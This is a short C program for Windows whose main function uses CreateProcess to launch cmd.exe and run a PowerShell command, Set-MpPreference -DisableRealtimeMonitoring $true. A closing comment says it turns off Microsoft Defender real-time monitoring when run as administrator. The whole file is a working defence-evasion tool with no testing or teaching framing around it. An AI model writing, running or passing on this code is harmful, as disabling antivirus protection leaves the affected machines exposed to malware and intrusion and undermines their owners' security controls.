#include <windows.h>

 void launcher(char *command, char *argument)
    {
        STARTUPINFO            sinfo;        
        PROCESS_INFORMATION    pinfo;        
        memset(&sinfo, 0, sizeof(STARTUPINFO));
        memset(&pinfo, 0, sizeof(PROCESS_INFORMATION));
        // test control wShowWindow
        sinfo.dwFlags = STARTF_USESHOWWINDOW;
        sinfo.wShowWindow = SW_SHOWMAXIMIZED;
        BOOL bSucess = CreateProcess(command, argument, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &sinfo, &pinfo);
    }


int main(void){

	launcher("c:\\windows\\system32\\cmd.exe", "/c powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");
}


//Set-MpPreference -DisableRealtimeMonitoring $true

//this should turn off defender RTM if run as admin. 